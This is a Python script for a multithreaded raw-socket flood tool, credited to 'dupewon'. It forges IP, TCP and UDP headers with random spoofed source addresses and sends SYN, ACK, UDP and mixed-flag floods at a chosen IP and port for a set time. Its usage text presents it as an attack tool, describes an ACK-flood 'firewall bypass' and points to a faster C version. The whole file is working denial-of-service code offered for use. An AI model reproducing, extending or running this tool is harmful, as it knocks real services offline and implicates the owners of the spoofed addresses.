# made by dupewon


import sys
import os
import struct
import socket
import random
import threading
import signal
import time



g_running = True
g_packets_sent = 0
g_lock = threading.Lock()




def checksum(data: bytes) -> int:
    if len(data) % 2:
        data += b'\x00'
    s = 0
    for i in range(0, len(data), 2):
        w = (data[i] << 8) + data[i + 1]
        s += w
    s = (s >> 16) + (s & 0xFFFF)
    s += (s >> 16)
    return ~s & 0xFFFF


def rand_ip() -> str:
    while True:
        a = random.randint(1, 254)
        if a in (10, 127, 224, 225, 226, 227, 228, 229, 230, 231,
                 232, 233, 234, 235, 236, 237, 238, 239, 240, 255):
            continue
        b = random.randint(0, 255)
        c = random.randint(0, 255)
        d = random.randint(1, 254)
        return f"{a}.{b}.{c}.{d}"


def rand_port() -> int:
    return random.randint(1024, 65535)


def ip_header(src_ip: str, dst_ip: str, protocol: int, payload_len: int) -> bytes:
    ver_ihl = 0x45
    tos = 0
    total_len = 20 + payload_len
    ident = random.randint(0, 65535)
    frag_off = 0
    ttl = 64 + random.randint(0, 63)


    header = struct.pack('!BBHHHBBH4s4s',
                         ver_ihl, tos, total_len, ident, frag_off,
                         ttl, protocol, 0,
                         socket.inet_aton(src_ip),
                         socket.inet_aton(dst_ip))

    chk = checksum(header)
    header = struct.pack('!BBHHHBBH4s4s',
                         ver_ihl, tos, total_len, ident, frag_off,
                         ttl, protocol, chk,
                         socket.inet_aton(src_ip),
                         socket.inet_aton(dst_ip))
    return header


def tcp_header(src_ip: str, dst_ip: str, src_port: int, dst_port: int,
               seq: int, ack_seq: int, flags: int) -> bytes:
    data_offset = 5 << 4
    window = random.randint(1024, 65535)
    urgent = 0


    tcp_hdr = struct.pack('!HHIIBBHHH',
                          src_port, dst_port, seq, ack_seq,
                          data_offset, flags, window, 0, urgent)


    tcp_len = len(tcp_hdr)
    pseudo = struct.pack('!4s4sBBH',
                         socket.inet_aton(src_ip),
                         socket.inet_aton(dst_ip),
                         0, socket.IPPROTO_TCP, tcp_len)

    chk = checksum(pseudo + tcp_hdr)

    tcp_hdr = struct.pack('!HHIIBBHHH',
                          src_port, dst_port, seq, ack_seq,
                          data_offset, flags, window, chk, urgent)
    return tcp_hdr


def udp_header(src_ip: str, dst_ip: str, src_port: int, dst_port: int,
               payload: bytes) -> bytes:
    udp_len = 8 + len(payload)

    udp_hdr = struct.pack('!HHHH', src_port, dst_port, udp_len, 0)

    pseudo = struct.pack('!4s4sBBH',
                         socket.inet_aton(src_ip),
                         socket.inet_aton(dst_ip),
                         0, socket.IPPROTO_UDP, udp_len)

    chk = checksum(pseudo + udp_hdr + payload)
    if chk == 0:
        chk = 0xFFFF

    udp_hdr = struct.pack('!HHHH', src_port, dst_port, udp_len, chk)
    return udp_hdr





FIN = 0x01
SYN = 0x02
RST = 0x04
PSH = 0x08
ACK = 0x10
URG = 0x20


def syn_flood(target_ip: str, target_port: int):
    global g_running, g_packets_sent

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    except PermissionError:
        print("  [!] need root for raw sockets")
        return

    while g_running:
        src_ip = rand_ip()
        src_port = rand_port()
        seq = random.randint(0, 0xFFFFFFFF)

        ip_hdr = ip_header(src_ip, target_ip, socket.IPPROTO_TCP, 20)
        tcp_hdr = tcp_header(src_ip, target_ip, src_port, target_port, seq, 0, SYN)

        packet = ip_hdr + tcp_hdr

        try:
            sock.sendto(packet, (target_ip, 0))
            with g_lock:
                g_packets_sent += 1
        except Exception:
            pass

    sock.close()


def ack_flood(target_ip: str, target_port: int):
    global g_running, g_packets_sent

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    except PermissionError:
        print("  [!] need root for raw sockets")
        return

    while g_running:
        src_ip = rand_ip()
        src_port = rand_port()
        seq = random.randint(0, 0xFFFFFFFF)
        ack = random.randint(0, 0xFFFFFFFF)

        ip_hdr = ip_header(src_ip, target_ip, socket.IPPROTO_TCP, 20)
        tcp_hdr = tcp_header(src_ip, target_ip, src_port, target_port, seq, ack, ACK)

        packet = ip_hdr + tcp_hdr

        try:
            sock.sendto(packet, (target_ip, 0))
            with g_lock:
                g_packets_sent += 1
        except Exception:
            pass

    sock.close()


def udp_flood(target_ip: str, target_port: int):
    global g_running, g_packets_sent

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    except PermissionError:
        print("  [!] need root for raw sockets")
        return

    while g_running:
        src_ip = rand_ip()
        src_port = rand_port()
        payload_len = random.randint(512, 1400)
        payload = bytes(random.getrandbits(8) for _ in range(payload_len))

        ip_hdr = ip_header(src_ip, target_ip, socket.IPPROTO_UDP, 8 + payload_len)
        udp_hdr = udp_header(src_ip, target_ip, src_port, target_port, payload)

        packet = ip_hdr + udp_hdr + payload

        try:
            sock.sendto(packet, (target_ip, 0))
            with g_lock:
                g_packets_sent += 1
        except Exception:
            pass

    sock.close()


def rawtcp_flood(target_ip: str, target_port: int):
    global g_running, g_packets_sent

    flag_combos = [
        SYN,
        SYN | ACK,
        ACK,
        FIN,
        FIN | ACK,
        RST,
        PSH | ACK,
        SYN | URG,
        0,
        SYN | ACK | FIN | PSH | URG,
    ]

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    except PermissionError:
        print("  [!] need root for raw sockets")
        return

    while g_running:
        src_ip = rand_ip()
        src_port = rand_port()
        seq = random.randint(0, 0xFFFFFFFF)
        ack_n = random.randint(0, 0xFFFFFFFF)
        flags = random.choice(flag_combos)

        ip_hdr = ip_header(src_ip, target_ip, socket.IPPROTO_TCP, 20)
        tcp_hdr = tcp_header(src_ip, target_ip, src_port, target_port, seq, ack_n, flags)

        packet = ip_hdr + tcp_hdr

        try:
            sock.sendto(packet, (target_ip, 0))
            with g_lock:
                g_packets_sent += 1
        except Exception:
            pass

    sock.close()


def rawudp_flood(target_ip: str, target_port: int):
    global g_running, g_packets_sent

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 * 1024 * 1024)
    except PermissionError:
        print("  [!] need root for raw sockets")
        return


    base_payload = bytes(random.getrandbits(8) for _ in range(1472))

    while g_running:
        src_ip = rand_ip()
        src_port = rand_port()


        payload = bytearray(base_payload)
        for _ in range(4):
            payload[random.randint(0, 1471)] = random.randint(0, 255)
        payload = bytes(payload)

        ip_hdr = ip_header(src_ip, target_ip, socket.IPPROTO_UDP, 8 + 1472)
        udp_hdr = udp_header(src_ip, target_ip, src_port, target_port, payload)

        packet = ip_hdr + udp_hdr + payload

        try:
            sock.sendto(packet, (target_ip, 0))
            with g_lock:
                g_packets_sent += 1
        except Exception:
            pass

    sock.close()




def stats_printer(duration: int):
    global g_running, g_packets_sent
    start = time.time()
    last_count = 0

    print()
    while g_running:
        time.sleep(1)
        elapsed = int(time.time() - start)

        if duration > 0 and elapsed >= duration:
            g_running = False
            break

        with g_lock:
            current = g_packets_sent

        pps = current - last_count
        last_count = current

        print(f"\r  [*] elapsed: {elapsed}s | packets: {current:,} | pps: {pps:,}   ",
              end='', flush=True)

    print(f"\n\n  [+] attack finished. total packets: {g_packets_sent:,}\n")


def signal_handler(sig, frame):
    global g_running
    g_running = False




METHODS = {
    'syn':    ('SYN FLOOD', syn_flood),
    'ack':    ('ACK FLOOD', ack_flood),
    'udp':    ('UDP FLOOD', udp_flood),
    'rawtcp': ('RAW TCP FLOOD', rawtcp_flood),
    'rawudp': ('RAW UDP FLOOD', rawudp_flood),
}


def banner():
    print()
    print("  ╔══════════════════════════════════════════════╗")
    print("  ║          RAW SOCKET FLOOD TOOL (PY)          ║")
    print("  ║    syn | ack | udp | rawtcp | rawudp         ║")
    print("  ╚══════════════════════════════════════════════╝")
    print()


def usage():
    banner()
    print(f"  usage: sudo python3 {sys.argv[0]} <ip> <port> <method> <threads> <duration>")
    print()
    print("  methods:")
    print("    syn     — SYN flood (half-open connections)")
    print("    ack     — ACK flood (stateful firewall bypass)")
    print("    udp     — UDP flood (random payload 512-1400b)")
    print("    rawtcp  — raw TCP with random flag combos")
    print("    rawudp  — raw UDP max payload (1472b)")
    print()
    print(f"  example: sudo python3 {sys.argv[0]} 1.2.3.4 80 syn 50 60")
    print("           sends SYN flood to 1.2.3.4:80 with 50 threads for 60s")
    print()
    print("  duration 0 = infinite (ctrl+c to stop)")
    print()
    print("  note: python version is slower than C. for max pps, use the C version.")
    print()


def main():
    global g_running

    if len(sys.argv) != 6:
        usage()
        sys.exit(1)

    if os.getuid() != 0:
        print("\n  [!] raw sockets require root. run with sudo.\n")
        sys.exit(1)

    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    method_key = sys.argv[3].lower()
    threads = int(sys.argv[4])
    duration = int(sys.argv[5])


    try:
        socket.inet_aton(target_ip)
    except socket.error:
        print(f"\n  [!] invalid target ip: {target_ip}\n")
        sys.exit(1)

    if target_port < 1 or target_port > 65535:
        print(f"\n  [!] invalid port: {target_port}\n")
        sys.exit(1)

    if method_key not in METHODS:
        print(f"\n  [!] unknown method: {method_key}")
        print("  [!] valid: syn | ack | udp | rawtcp | rawudp\n")
        sys.exit(1)

    threads = max(1, min(threads, 512))

    method_name, flood_func = METHODS[method_key]

    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    banner()
    print(f"  ╔══════════════════════════════════════════════╗")
    print(f"  ║              ATTACK LAUNCHED                 ║")
    print(f"  ╠══════════════════════════════════════════════╣")
    print(f"  ║  target  : {target_ip:<33s}║")
    print(f"  ║  port    : {target_port:<33d}║")
    print(f"  ║  method  : {method_name:<33s}║")
    print(f"  ║  threads : {threads:<33d}║")
    print(f"  ║  duration: {duration:<33d}║")
    print(f"  ╚══════════════════════════════════════════════╝")


    thread_list = []
    for _ in range(threads):
        t = threading.Thread(target=flood_func, args=(target_ip, target_port), daemon=True)
        t.start()
        thread_list.append(t)


    stats_printer(duration)

    g_running = False
    for t in thread_list:
        t.join(timeout=2)


if __name__ == '__main__':
    main()
